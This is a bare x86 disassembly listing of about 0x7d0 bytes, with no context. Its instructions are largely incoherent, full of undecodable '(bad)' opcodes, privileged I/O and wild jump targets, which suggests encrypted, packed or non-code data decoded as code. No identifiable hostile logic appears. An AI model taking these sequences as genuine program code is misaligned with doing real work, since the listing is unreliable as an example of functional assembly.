  403ff4:	cmp    eax,0x5ee0ef99
  403ff9:	pop    eax
  403ffa:	dec    esp
  403ffb:	push   es
  403ffc:	adc    eax,0x217be1b8
  404001:	jmp    0x574056b7
  404006:	or     al,0x90
  404008:	sbb    eax,0xe52e2e96
  40400d:	sub    eax,DWORD PTR [eax+0x75de468c]
  404013:	add    bh,al
  404015:	test   eax,0x2ebc52ca
  40401a:	or     eax,0xf07cd94e
  40401f:	popa   
  404020:	iret   
  404021:	test   eax,0x783754a3
  404026:	ret    0x1838
  404029:	sbb    DWORD PTR [esi],ecx
  40402b:	or     edi,edx
  40402d:	adc    BYTE PTR [ecx+edi*2-0x556cfb91],al
  404034:	or     dl,BYTE PTR [edi+0x3dd6c2b]
  40403a:	loop   0x404099
  40403c:	(bad)  
  40403e:	(bad)  
  40403f:	ins    BYTE PTR es:[edi],dx
  404040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404041:	fstp   TBYTE PTR [edx]
  404043:	add    eax,0x9fd24fde
  404048:	fdivr  DWORD PTR [edi-0x3daa4a99]
  40404e:	fmul   DWORD PTR [eax+0x49]
  404051:	xor    dl,BYTE PTR [edi-0x27b3add5]
  404057:	push   ds
  404058:	mov    ah,0xd2
  40405a:	jae    0x403fff
  40405c:	cmp    al,0x9c
  40405e:	pop    ecx
  40405f:	push   0x8ff34d10
  404064:	fistp  WORD PTR [ebp*8+0xfc8f827]
  40406b:	sub    eax,DWORD PTR [eax-0x7dbef896]
  404071:	fwait
  404072:	repz adc eax,0xb66bf820
  404078:	pop    es
  404079:	lea    esp,[ebx]
  40407b:	in     al,dx
  40407c:	cmp    eax,0x9d9baf18
  404081:	das    
  404082:	inc    ebp
  404083:	sahf   
  404084:	ret    
  404085:	shl    DWORD PTR [ebp+0x2e34fddf],cl
  40408b:	xor    al,0x3
  40408d:	inc    ebp
  40408e:	jl     0x404045
  404090:	xor    ah,cl
  404092:	aaa    
  404093:	das    
  404094:	inc    esi
  404095:	and    eax,eax
  404097:	pop    ecx
  404098:	sbb    bh,BYTE PTR [ebx]
  40409a:	iret   
  40409b:	adc    edx,edx
  40409d:	pop    edx
  40409e:	inc    ebp
  40409f:	dec    esi
  4040a0:	popf   
  4040a1:	add    DWORD PTR [eax],esp
  4040a3:	cs mov ah,0xb3
  4040a6:	arpl   sp,cx
  4040a8:	inc    eax
  4040a9:	xor    eax,0x67bf3cda
  4040ae:	int    0x23
  4040b0:	test   al,0xd1
  4040b2:	stc    
  4040b3:	test   al,0x20
  4040b5:	lahf   
  4040b6:	outs   dx,DWORD PTR ds:[esi]
  4040b7:	(bad)  
  4040b8:	out    dx,al
  4040b9:	push   ds
  4040ba:	or     eax,0x9ad18a79
  4040bf:	aas    
  4040c0:	push   0xdb28bc36
  4040c5:	iret   
  4040c6:	xlat   BYTE PTR ds:[ebx]
  4040c7:	lea    ebp,[esi+0x1b]
  4040ca:	leave  
  4040cb:	sbb    esi,DWORD PTR [ebx+esi*1]
  4040ce:	mov    ah,0x17
  4040d0:	xlat   BYTE PTR ds:[ebx]
  4040d1:	mov    ?,WORD PTR [ebx+0x55]
  4040d4:	mov    cl,0x7e
  4040d6:	mov    esp,0xa08a91d1
  4040db:	push   cs
  4040dc:	sub    edi,DWORD PTR [esp+edi*1-0x59]
  4040e0:	femms  
  4040e2:	cwde   
  4040e3:	xlat   BYTE PTR ds:[ebx]
  4040e4:	fnstsw WORD PTR [esi]
  4040e6:	or     DWORD PTR [ebp+0x57bee83b],edx
  4040ec:	jb     0x404167
  4040ee:	jge    0x40414e
  4040f0:	int    0xac
  4040f2:	mov    eax,0x681090c5
  4040f7:	jbe    0x4040da
  4040f9:	xchg   ebp,eax
  4040fa:	js     0x40409d
  4040fc:	scas   al,BYTE PTR es:[edi]
  4040fd:	scas   eax,DWORD PTR es:[edi]
  4040fe:	mul    DWORD PTR [esp+esi*8-0x48]
  404102:	xchg   ebx,eax
  404103:	sar    DWORD PTR [ecx+0x4],0xe
  404107:	mov    bl,BYTE PTR [ebx-0x23]
  40410a:	dec    ebx
  40410b:	lods   eax,DWORD PTR ds:[esi]
  40410c:	cs shl dl,cl
  40410f:	lea    ebp,[ebx+esi*2-0x2ed139e]
  404116:	repz ja 0x404137
  404119:	mov    al,ds:0xa110ecda
  40411e:	adc    cl,dh
  404120:	lea    eax,[edx+0x7d5ba123]
  404126:	jb     0x404120
  404128:	test   DWORD PTR [eax-0x851c2e3],0x5aa7f6bd
  404132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404133:	out    0xd3,eax
  404135:	mov    ebp,DWORD PTR [edx]
  404137:	stos   BYTE PTR es:[edi],al
  404138:	test   BYTE PTR ds:0x4edbe00e,dh
  40413e:	test   dh,bl
  404140:	mov    eax,0xf3d96380
  404145:	mov    ds:0x1cbaa18e,eax
  40414a:	jo     0x404102
  40414c:	shr    BYTE PTR [eax-0x7ea5e4c6],cl
  404152:	push   es
  404153:	inc    edi
  404154:	inc    edx
  404155:	xor    ecx,esp
  404157:	call   0x767ed105
  40415c:	inc    ebx
  40415d:	and    ebp,DWORD PTR [ebp-0x5697c746]
  404163:	sbb    ah,al
  404165:	mov    edx,cs
  404167:	fmul   QWORD PTR [esi+0x77632fd0]
  40416d:	sbb    DWORD PTR [ebx-0x8],ebp
  404170:	pop    edi
  404171:	(bad)  
  404172:	mov    BYTE PTR [ebx],ch
  404174:	fistp  DWORD PTR [ebp+0x57]
  404177:	push   0x66
  404179:	pop    ebx
  40417a:	gs xchg ebx,eax
  40417c:	pop    es
  40417d:	add    eax,0xc7195065
  404182:	mov    cs,WORD PTR [edx+0x5d68724d]
  404188:	inc    esi
  404189:	icebp  
  40418a:	add    eax,0x86e3d906
  40418f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404190:	mov    ch,0xf3
  404192:	sub    eax,0x74f0eda8
  404197:	or     al,0xa6
  404199:	fdivr  DWORD PTR [eax-0x5e6ad16a]
  40419f:	callw  0x3f24
  4041a3:	dec    esp
  4041a4:	mov    BYTE PTR [eax-0x35],0x60
  4041a8:	int    0xf
  4041aa:	jno    0x404218
  4041ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041ad:	adc    BYTE PTR [ebp+0xf],dl
  4041b0:	clc    
  4041b1:	mov    esi,0xf7b3d2fa
  4041b6:	scas   eax,DWORD PTR es:[edi]
  4041b7:	and    eax,0xcf9e86a0
  4041bc:	sub    DWORD PTR [eax-0x38],edx
  4041bf:	jno    0x4041c6
  4041c1:	jle    0x40417c
  4041c3:	sub    DWORD PTR [edx+0x34],edx
  4041c6:	int3   
  4041c7:	xchg   ebp,eax
  4041c8:	test   al,0x4c
  4041ca:	push   ss
  4041cb:	mov    eax,DWORD PTR [ebx+ebp*1+0x21]
  4041cf:	jge    0x404195
  4041d1:	fsubr  DWORD PTR [ebx-0x40eeb59]
  4041d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041d8:	dec    esi
  4041d9:	idiv   BYTE PTR [edi+edi*2]
  4041dc:	sub    BYTE PTR [ebx],al
  4041de:	addr16 repnz mov ds:0xe297,eax
  4041e3:	loopne 0x40418b
  4041e5:	popa   
  4041e6:	push   ebp
  4041e7:	adc    eax,0x6d58e112
  4041ec:	call   0xa687:0xca50e4b8
  4041f3:	fsubp  st(0),st
  4041f5:	cmp    ch,bl
  4041f7:	jecxz  0x4041f5
  4041f9:	jbe    0x4041f2
  4041fb:	inc    esi
  4041fc:	push   edx
  4041fd:	mov    edi,0x4e60f8b1
  404202:	jl     0x40418f
  404204:	imul   ebx,ecx,0x56
  404207:	mov    ebx,0x29dd053
  40420c:	mov    ebx,0x917eccc5
  404211:	xor    cl,bh
  404213:	cmp    al,0xbd
  404215:	jecxz  0x40422f
  404217:	mov    ebp,0x7d333b6f
  40421c:	mov    cl,0x4e
  40421e:	enter  0x7c1a,0x3b
  404222:	mov    ebx,0x2927f96b
  404227:	imul   esp,esp,0xcd41c809
  40422d:	xchg   esi,eax
  40422e:	pop    ecx
  40422f:	fld    QWORD PTR [ebx-0x6e52ad88]
  404235:	push   edx
  404236:	xor    al,0x35
  404238:	and    ecx,edi
  40423a:	lea    edx,[eax]
  40423c:	loop   0x4041db
  40423e:	mov    DWORD PTR [esi],ecx
  404240:	cmp    bh,BYTE PTR [edi]
  404242:	pop    ds
  404243:	or     bl,ah
  404245:	dec    eax
  404246:	xor    ah,dl
  404248:	push   esp
  404249:	xor    DWORD PTR [eax],edx
  40424b:	xlat   BYTE PTR ds:[ebx]
  40424c:	sbb    DWORD PTR [ecx],eax
  40424e:	jmp    0x264804af
  404253:	dec    eax
  404254:	xchg   ecx,eax
  404255:	adc    eax,0x85cb5c19
  40425a:	add    cl,BYTE PTR [edi+0x7e]
  40425d:	rcr    bh,cl
  40425f:	loop   0x404240
  404261:	adc    BYTE PTR [esi-0x46],bh
  404264:	and    BYTE PTR [edi+0x11e801e7],cl
  40426a:	inc    esi
  40426b:	fstp   DWORD PTR [edi]
  40426d:	or     ebp,DWORD PTR [edx-0x4d]
  404270:	xchg   esi,eax
  404271:	or     eax,0xaaf79ff4
  404276:	fst    QWORD PTR [eax+0x72]
  404279:	jecxz  0x4042d7
  40427b:	pop    edx
  40427c:	rcr    DWORD PTR [esi-0x61],cl
  40427f:	js     0x404210
  404281:	cs icebp 
  404283:	sub    ch,BYTE PTR [ebx+0xe70f0b6]
  404289:	out    dx,al
  40428a:	lea    edx,[edi]
  40428c:	add    al,BYTE PTR [edi+0x41f65208]
  404292:	adc    bh,ch
  404294:	sub    dh,BYTE PTR [ebx]
  404296:	inc    eax
  404297:	sti    
  404298:	push   cs
  404299:	(bad)  
  40429a:	mov    edi,0x1d493c09
  40429f:	sub    BYTE PTR [edi-0x2443d6b4],dl
  4042a5:	sar    bh,1
  4042a7:	loope  0x404240
  4042a9:	inc    eax
  4042aa:	adc    al,0xb7
  4042ac:	cdq    
  4042ad:	or     al,0xa3
  4042af:	push   ebp
  4042b0:	mov    bh,0x8f
  4042b2:	cli    
  4042b3:	or     esp,DWORD PTR [edx]
  4042b5:	fisub  WORD PTR [edx+0x26f5c03a]
  4042bb:	jge    0x40429b
  4042bd:	enter  0x4af2,0x17
  4042c1:	push   es
  4042c2:	loope  0x4042a1
  4042c4:	les    esi,FWORD PTR [eax+0x23]
  4042c7:	es retf 
  4042c9:	js     0x40430a
  4042cb:	pop    esi
  4042cc:	mov    WORD PTR [edx],ds
  4042ce:	push   edx
  4042cf:	inc    eax
  4042d0:	adc    edx,DWORD PTR [esi+ebp*8+0xe9a289a]
  4042d7:	push   ebp
  4042d8:	fmulp  st(7),st
  4042da:	cmp    BYTE PTR [ebp+0x3c],dl
  4042dd:	sbb    ecx,0x68e89e5b
  4042e3:	repnz popf 
  4042e5:	out    0x15,eax
  4042e7:	enter  0xf82b,0xb
  4042eb:	call   0x6e7db3b8
  4042f0:	jo     0x404281
  4042f2:	adc    eax,0x6fdf1b1a
  4042f7:	mov    ecx,0x6cb919fd
  4042fc:	mov    dl,0xad
  4042fe:	lea    ebp,[eax+ebx*8]
  404301:	fptan  
  404303:	mov    edi,0x9f91d825
  404308:	jne    0x404337
  40430a:	xor    esi,edi
  40430c:	mov    dl,ch
  40430e:	pop    edx
  40430f:	rcl    BYTE PTR [edx],1
  404311:	shl    dh,1
  404313:	push   0x5d
  404315:	jno    0x4042ec
  404317:	push   eax
  404318:	fcomp  QWORD PTR ds:0xe7eccd2d
  40431e:	lea    ecx,[eax+0x1461d1d1]
  404324:	ds hlt 
  404326:	cld    
  404327:	pusha  
  404328:	lods   al,BYTE PTR ds:[esi]
  404329:	cmp    DWORD PTR [esi],eax
  40432b:	dec    ebp
  40432c:	scas   eax,DWORD PTR es:[edi]
  40432d:	xor    bh,dh
  40432f:	sub    eax,0xc8e5d2d9
  404334:	mov    ?,WORD PTR [esi]
  404336:	imul   ebp,ebx,0xfffffff0
  404339:	dec    esi
  40433a:	scas   eax,DWORD PTR es:[edi]
  40433b:	(bad)  
  40433c:	mov    ah,0x21
  40433e:	fucom  st(6)
  404340:	out    dx,al
  404341:	jno    0x404372
  404343:	clc    
  404344:	cmp    BYTE PTR [ebp-0x113a7fdc],0x41
  40434b:	xor    BYTE PTR [eax-0x7e4014e8],al
  404351:	cmp    ah,BYTE PTR [ecx+eax*8+0x4d]
  404355:	push   0x12697c10
  40435a:	loop   0x4042fc
  40435c:	das    
  40435d:	add    DWORD PTR [ebp+0x5e],ecx
  404360:	mul    BYTE PTR [esi-0x42]
  404363:	jae    0x4043dc
  404365:	sub    BYTE PTR [ecx-0x44],bh
  404368:	push   eax
  404369:	shld   DWORD PTR [edi+0x648fa9d5],esi,cl
  404370:	sub    ah,BYTE PTR [edi]
  404372:	mov    ebx,0xd67cf9d2
  404377:	pop    ds
  404378:	dec    eax
  404379:	pop    ebx
  40437a:	push   ss
  40437b:	add    eax,0xe1d04612
  404380:	bound  edx,QWORD PTR [edx+0x78]
  404383:	add    BYTE PTR [ecx-0x6c70283a],bl
  404389:	or     ebp,ebx
  40438b:	repnz dec esi
  40438d:	dec    edx
  40438e:	pop    edx
  40438f:	mov    eax,ds:0xb6833495
  404394:	push   edx
  404395:	js     0x404323
  404397:	sbb    ch,ah
  404399:	sub    DWORD PTR [esi-0x26db75e1],0xffffffc3
  4043a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043a1:	mov    esi,0x879e5fd5
  4043a6:	sar    DWORD PTR [edx-0xc],0x68
  4043aa:	sbb    al,0x2d
  4043ac:	ret    0x5ca4
  4043af:	adc    al,0x1d
  4043b1:	shl    BYTE PTR [esi-0xa],cl
  4043b4:	pop    ds
  4043b5:	lods   eax,DWORD PTR ds:[esi]
  4043b6:	adc    al,0x3d
  4043b8:	ret    0xe7c0
  4043bb:	jo     0x4043f7
  4043bd:	sub    bl,ah
  4043bf:	int    0xa0
  4043c1:	fild   QWORD PTR [eax-0x3073b9cf]
  4043c7:	in     eax,0x9e
  4043c9:	add    cl,BYTE PTR [edi-0x2dad33f7]
  4043cf:	dec    ecx
  4043d0:	pop    ebp
  4043d1:	popa   
  4043d2:	cld    
  4043d3:	jae    0x40439f
  4043d5:	out    dx,eax
  4043d6:	and    al,0xa6
  4043d8:	push   ds
  4043d9:	stos   DWORD PTR es:[edi],eax
  4043da:	pushf  
  4043db:	pushf  
  4043dc:	lds    edi,FWORD PTR [ecx-0x51]
  4043df:	addr16 cdq 
  4043e1:	jmp    0x884bf75c
  4043e6:	lock pop edi
  4043e8:	fs hlt 
  4043ea:	jb     0x4043d9
  4043ec:	ins    DWORD PTR es:[edi],dx
  4043ed:	fwait
  4043ee:	ret    0x83f9
  4043f1:	es icebp 
  4043f3:	es mov eax,0x80a59a67
  4043f9:	pop    edx
  4043fa:	je     0x40439a
  4043fc:	xchg   ebp,eax
  4043fd:	mov    ch,0x41
  4043ff:	sub    bh,dl
  404401:	jmp    DWORD PTR [ebp-0x21]
  404404:	xlat   BYTE PTR ds:[ebx]
  404405:	xor    BYTE PTR [ebx+0x27b904d9],dh
  40440b:	pop    es
  40440c:	pusha  
  40440d:	push   ebx
  40440e:	or     DWORD PTR [ebx+ecx*1],0xffffffbc
  404412:	mov    ah,bh
  404414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404415:	(bad)  
  404416:	es in  eax,0x1e
  404419:	xlat   BYTE PTR ds:[ebx]
  40441a:	ss fsubp st(5),st
  40441d:	jo     0x404475
  40441f:	mov    cl,0x24
  404421:	dec    ecx
  404422:	jo     0x40442e
  404424:	neg    DWORD PTR [edx]
  404426:	stc    
  404427:	fcmove st,st(6)
  404429:	sahf   
  40442a:	out    0x5b,al
  40442c:	bound  esp,QWORD PTR [esi+0x440a2e05]
  404432:	jecxz  0x4043bd
  404434:	push   ds
  404435:	inc    ebx
  404436:	in     eax,dx
  404437:	(bad)  
  404438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404439:	cli    
  40443a:	mov    ebp,0x4193bf9b
  40443f:	test   BYTE PTR [eax-0x1421d569],cl
  404445:	xchg   esi,eax
  404446:	add    eax,0x81db0205
  40444b:	dec    edi
  40444c:	data16 aad 0x9a
  40444f:	sub    bh,al
  404451:	xchg   BYTE PTR [ebx+esi*2+0x5b6a4b86],al
  404458:	aad    0x4d
  40445a:	call   0x24dc:0x936bf138
  404461:	test   DWORD PTR [edx+ebp*8+0x60c18495],ebp
  404468:	jnp    0x404420
  40446a:	not    dh
  40446c:	pop    eax
  40446d:	rcl    BYTE PTR [eax],0x3f
  404470:	imul   ebx,ebp,0x1d24966b
  404476:	dec    ecx
  404477:	sar    DWORD PTR [eax-0x36],1
  40447a:	jge    0x404497
  40447c:	fstp   DWORD PTR [ebx-0x2702bfed]
  404482:	adc    al,0x3c
  404484:	adc    DWORD PTR [edx+0x3f],esi
  404487:	push   ebx
  404488:	push   edi
  404489:	sbb    DWORD PTR [ecx-0x6978a6da],ecx
  40448f:	mov    edi,0x4df24517
  404494:	mov    esi,0xa7692390
  404499:	inc    ebp
  40449a:	clc    
  40449b:	(bad)  
  40449c:	stos   BYTE PTR es:[edi],al
  40449d:	loope  0x4044d0
  40449f:	sbb    ecx,0xf3917d5c
  4044a5:	mov    DWORD PTR [ecx],eax
  4044a7:	fimul  DWORD PTR [edi+ecx*1+0x291382c7]
  4044ae:	adc    al,0xfd
  4044b0:	pop    esp
  4044b1:	neg    BYTE PTR [ecx]
  4044b3:	ins    BYTE PTR es:[edi],dx
  4044b4:	iret   
  4044b5:	jns    0x404437
  4044b7:	and    al,0x11
  4044b9:	jae    0x404448
  4044bb:	sbb    DWORD PTR [ebp+0x70],edi
  4044be:	mov    dh,0xe
  4044c0:	pop    esi
  4044c1:	fldenv [esi+0x8]
  4044c4:	bound  ecx,QWORD PTR [ebx]
  4044c6:	(bad)  
  4044c7:	sbb    eax,0x12538e7
  4044cc:	mov    eax,0xe495bb8b
  4044d1:	dec    esi
  4044d2:	xlat   BYTE PTR ds:[ebx]
  4044d3:	(bad)  
  4044d4:	jo     0x4044a4
  4044d6:	pop    ds
  4044d7:	sbb    edx,DWORD PTR [edx+0x50]
  4044da:	mov    DWORD PTR [ebx+0x46],esp
  4044dd:	fidiv  WORD PTR [ebx+0x5f5668be]
  4044e3:	pop    esp
  4044e4:	pushf  
  4044e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044e6:	daa    
  4044e7:	xchg   DWORD PTR fs:[edi+0x49],eax
  4044eb:	ja     0x40448c
  4044ed:	xchg   edi,eax
  4044ee:	or     DWORD PTR [ecx+0x5acaa43d],ecx
  4044f4:	jno    0x4044b0
  4044f6:	lock inc edi
  4044f8:	aad    0x35
  4044fa:	imul   edi,DWORD PTR [ebx+ebp*1],0x23
  4044fe:	sbb    bl,BYTE PTR [edi+esi*1+0x66542c29]
  404505:	adc    al,0x95
  404507:	aam    0x44
  404509:	pop    DWORD PTR [ecx-0x506680b9]
  40450f:	cdq    
  404510:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404511:	xchg   edx,eax
  404512:	pushf  
  404513:	mov    ch,0x51
  404515:	push   ecx
  404516:	cmp    dh,BYTE PTR [edi]
  404518:	sbb    edx,ecx
  40451a:	fst    st(4)
  40451c:	adc    esp,DWORD PTR [eax-0xb]
  40451f:	ja     0x4044f9
  404521:	stos   BYTE PTR es:[edi],al
  404522:	sbb    al,0xbc
  404524:	call   0x4274b86f
  404529:	enter  0x84bc,0xea
  40452d:	pop    DWORD PTR [eax]
  40452f:	ja     0x40455e
  404531:	mov    ebp,0x7cfe686b
  404536:	aas    
  404537:	push   cs
  404538:	lock jp 0x4044d6
  40453b:	pop    edi
  40453c:	mov    ds:0xacb8c5a8,eax
  404541:	cmp    ebp,esi
  404543:	je     0x404517
  404545:	xor    edi,DWORD PTR [ecx]
  404547:	adc    eax,0x1bb9b993
  40454c:	sbb    ebp,DWORD PTR [eax-0x68]
  40454f:	repnz sbb al,0x72
  404552:	sbb    DWORD PTR [ebp+esi*1-0x7a],ebx
  404556:	scas   eax,DWORD PTR es:[edi]
  404557:	pop    edx
  404558:	fldcw  WORD PTR [ebp-0x3f]
  40455b:	mov    edx,0xe9d8007e
  404560:	or     BYTE PTR [ebx],al
  404562:	les    eax,FWORD PTR [eax+0x575b8a62]
  404568:	xor    ebx,DWORD PTR [esp+edi*2]
  40456b:	scas   eax,DWORD PTR es:[edi]
  40456c:	and    al,ah
  40456e:	test   eax,esp
  404570:	sub    ah,BYTE PTR [ebx+ebp*1+0x5b4581af]
  404577:	xlat   BYTE PTR ds:[ebx]
  404578:	push   esp
  404579:	dec    eax
  40457a:	and    dl,bl
  40457c:	mov    dl,0xe2
  40457e:	add    esi,DWORD PTR [eax+0x2f]
  404581:	inc    eax
  404582:	dec    edx
  404583:	add    ebp,ebx
  404585:	icebp  
  404586:	test   BYTE PTR [eax-0x6f],0x34
  40458a:	(bad)  
  40458b:	lock inc DWORD PTR [ebp-0x5a8577e5]
  404592:	ins    BYTE PTR es:[edi],dx
  404593:	stos   BYTE PTR es:[edi],al
  404594:	call   0xbf6a9f8b
  404599:	or     al,0x24
  40459b:	jb     0x404579
  40459d:	mov    esp,0x383df51d
  4045a2:	jb     0x4045ab
  4045a4:	pop    ebp
  4045a5:	push   0x51
  4045a7:	(bad)  
  4045a8:	hlt    
  4045a9:	sbb    ecx,esp
  4045ab:	or     BYTE PTR [edi+0xc36ed83],bl
  4045b1:	xchg   esp,eax
  4045b2:	stc    
  4045b3:	mov    ecx,0xee2a1008
  4045b8:	cld    
  4045b9:	xor    BYTE PTR [edi],0x9e
  4045bc:	xor    ch,0xae
  4045bf:	stos   BYTE PTR es:[edi],al
  4045c0:	sub    al,bl
  4045c2:	or     eax,0xf6324d7f
  4045c7:	pop    ebp
  4045c8:	lods   al,BYTE PTR ds:[esi]
  4045c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045ca:	addr16 inc ebx
  4045cc:	mov    BYTE PTR [ecx-0x30],ah
  4045cf:	test   eax,0xe9926ab3
  4045d4:	pop    esp
  4045d5:	jl     0x404654
  4045d7:	inc    eax
  4045d8:	(bad)
  4045db:	icebp  
  4045dc:	mov    al,cs:0xf72ccf05
  4045e2:	and    edi,DWORD PTR [ebx-0x4ae55d53]
  4045e8:	pop    ds
  4045e9:	lahf   
  4045ea:	or     eax,0x2b739247
  4045ef:	inc    edx
  4045f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045f1:	sub    BYTE PTR [ebp-0x4e],bh
  4045f4:	jno    0x404652
  4045f6:	and    al,dh
  4045f8:	jg     0x404642
  4045fa:	xor    ebx,DWORD PTR [ebx-0x39]
  4045fd:	stc    
  4045fe:	add    ah,bh
  404600:	push   edi
  404601:	cmp    bl,BYTE PTR [ebp+0x4d]
  404604:	pop    esi
  404605:	pop    ds
  404606:	data16 fwait
  404608:	sahf   
  404609:	xchg   ecx,eax
  40460a:	js     0x404663
  40460c:	lods   al,BYTE PTR ds:[esi]
  40460d:	xor    al,0x6f
  40460f:	push   esi
  404610:	jbe    0x907ef7f4
  404616:	push   edx
  404617:	outs   dx,BYTE PTR ds:[esi]
  404618:	pop    ecx
  404619:	sub    eax,0x2ffb6ea8
  40461e:	push   ss
  40461f:	in     al,dx
  404620:	scas   eax,DWORD PTR es:[edi]
  404621:	repnz loopne 0x404689
  404624:	fnstcw WORD PTR [ecx+0x4c]
  404627:	pushf  
  404628:	xor    BYTE PTR [ebx+eax*1],ch
  40462b:	ss sub al,0x23
  40462e:	jns    0x404647
  404630:	adc    ebx,eax
  404632:	jge    0x404694
  404634:	xchg   esi,eax
  404635:	outs   dx,BYTE PTR ds:[esi]
  404636:	in     eax,0x78
  404638:	adc    al,0xc7
  40463a:	(bad)  
  40463b:	popf   
  40463c:	jmp    0x404694
  40463e:	sar    BYTE PTR [edx],0x11
  404641:	aas    
  404642:	sub    eax,0xa6a812e
  404647:	iret   
  404648:	aad    0x86
  40464a:	or     DWORD PTR [eax+0x3e],0xffffffa2
  40464e:	inc    ebx
  40464f:	mov    ds:0xc195cf29,al
  404654:	mov    al,ds:0x71ecf732
  404659:	xchg   edi,eax
  40465a:	xchg   ecx,eax
  40465b:	int3   
  40465c:	jo     0x4045f7
  40465e:	sub    al,0x7b
  404660:	gs enter 0xbae7,0x2a
  404665:	ss push ecx
  404667:	imul   DWORD PTR [ecx-0x6d1ca866]
  40466d:	sahf   
  40466e:	jp     0x404674
  404670:	mov    WORD PTR [esi],fs
  404672:	idiv   DWORD PTR [ebx-0x27b1dc47]
  404678:	and    eax,0x45fe8d66
  40467d:	ins    BYTE PTR es:[edi],dx
  40467e:	mov    ch,0x2d
  404680:	push   esi
  404681:	js     0x4046fa
  404683:	imul   ah
  404685:	fisub  WORD PTR [ebx]
  404687:	or     al,0x9f
  404689:	loopne 0x40465a
  40468b:	mov    ds:0x15e61ac4,eax
  404690:	and    edx,DWORD PTR [ecx+0x71329f8a]
  404696:	mov    eax,ds:0x664905fc
  40469b:	in     al,0xdc
  40469d:	enter  0x3166,0x4
  4046a1:	(bad)  
  4046a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046a3:	xor    ecx,esi
  4046a5:	icebp  
  4046a6:	jns    0x4046b6
  4046a8:	adc    DWORD PTR [ebx+0x19],ecx
  4046ab:	xchg   ebp,eax
  4046ac:	dec    esi
  4046ad:	lock retf 0x6c2c
  4046b1:	out    0x97,eax
  4046b3:	cmp    eax,0x746905c
  4046b8:	fsubr  DWORD PTR [ecx]
  4046ba:	dec    esp
  4046bb:	mov    BYTE PTR [ebp-0x20],al
  4046be:	out    dx,al
  4046bf:	mov    ecx,0x24530ad8
  4046c4:	test   edi,0x618fb55d
  4046ca:	ret    
  4046cb:	inc    esi
  4046cc:	jae    0x404651
  4046ce:	sbb    bl,BYTE PTR [eax+0x7b]
  4046d1:	les    edi,FWORD PTR [ebp-0x9ff51bc]
  4046d7:	aad    0x5a
  4046d9:	or     DWORD PTR [edx-0x28],esp
  4046dc:	mov    al,bl
  4046de:	into   
  4046df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046e0:	mov    cl,0x12
  4046e2:	adc    DWORD PTR [esi],ebp
  4046e4:	ss enter 0xd96f,0xf7
  4046e9:	in     al,0xa8
  4046eb:	push   esi
  4046ec:	js     0x40472e
  4046ee:	aas    
  4046ef:	cmove  ecx,DWORD PTR es:[eax]
  4046f3:	mov    ds:0xee3b9719,eax
  4046f8:	pop    ebp
  4046f9:	in     al,0x9d
  4046fb:	ins    DWORD PTR es:[edi],dx
  4046fc:	out    dx,al
  4046fd:	gs test al,0xda
  404700:	add    al,0xcb
  404702:	stos   DWORD PTR es:[edi],eax
  404703:	mov    al,0xf1
  404705:	adc    eax,0xf014abb6
  40470a:	xchg   edi,eax
  40470c:	scas   al,BYTE PTR es:[edi]
  40470d:	or     al,0x92
  40470f:	dec    ebp
  404710:	lahf   
  404711:	or     eax,0x8cc8e220
  404716:	test   al,0x9d
  404718:	arpl   WORD PTR [eax],ax
  40471a:	data16 int3 
  40471c:	inc    eax
  40471d:	inc    esi
  40471e:	js     0x4046d7
  404720:	cmp    al,0xce
  404722:	push   cs
  404723:	fwait
  404724:	mov    esi,0xd882d306
  404729:	ss mov dh,0x7e
  40472c:	adc    dh,BYTE PTR [ebp+edi*2+0x477d75d3]
  404733:	jmp    0x404745
  404735:	sub    bh,bh
  404737:	mov    ch,0x5d
  404739:	pop    ebx
  40473a:	(bad)  
  40473b:	mov    ds:0x936c7fe1,eax
  404740:	test   al,0xf0
  404742:	in     eax,dx
  404743:	mov    DWORD PTR [esi+0x66],ebx
  404746:	dec    eax
  404747:	fisttp QWORD PTR [ecx+0x13]
  40474a:	sub    al,0x9f
  40474c:	iret   
  40474d:	test   ebp,edi
  40474f:	xchg   ebp,eax
  404750:	das    
  404751:	xchg   esi,eax
  404752:	fwait
  404753:	es push 0xd8469c97
  404759:	inc    edx
  40475a:	cmp    DWORD PTR ds:0xf2c24394,ebx
  404760:	shl    DWORD PTR [esi+0x2c],1
  404763:	out    0xce,al
  404765:	lods   eax,DWORD PTR ds:[esi]
  404766:	and    esp,ebp
  404768:	fs ret 0xa819
  40476c:	fnstenv ds:0x6ab1b287
  404772:	test   BYTE PTR [ecx*1+0x412a47e],0x25
  40477a:	(bad)  
  40477b:	pop    es
  40477c:	inc    eax
  40477d:	ins    BYTE PTR es:[edi],dx
  40477e:	xchg   edi,eax
  40477f:	or     eax,0x4e452a2a
  404784:	(bad)  
  404785:	icebp  
  404786:	das    
  404787:	xlat   BYTE PTR ds:[ebx]
  404788:	cmp    DWORD PTR [eax+ebx*4-0x61a6eabc],ecx
  40478f:	xor    DWORD PTR [ecx],0x8d620633
  404795:	sar    DWORD PTR [ecx-0x6a],1
  404798:	sahf   
  404799:	push   es
  40479a:	imul   esp,DWORD PTR [edi+0x73e7b4fd],0xbf730bec
  4047a4:	mov    bh,0x8f
  4047a6:	loope  0x4047e6
  4047a8:	push   esp
  4047a9:	mov    bl,0x5a
  4047ab:	out    0xa,al
  4047ad:	icebp  
  4047ae:	(bad)  
  4047af:	or     esp,edi
  4047b1:	add    edi,ebp
  4047b3:	jbe    0x40477d
  4047b5:	in     eax,dx
  4047b6:	rcr    DWORD PTR [ebx+ecx*4+0x1e],1
  4047ba:	add    eax,0x62d5703b
  4047bf:	jne    0x404818
  4047c1:	sbb    edx,DWORD PTR [ebp-0x4584d024]
  4047c7:	add    al,0x54
  4047c9:	icebp  
  4047ca:	inc    ecx
  4047cb:	clc    
  4047cc:	cmp    edi,ecx
  4047ce:	and    bl,BYTE PTR [edi+edi*4]
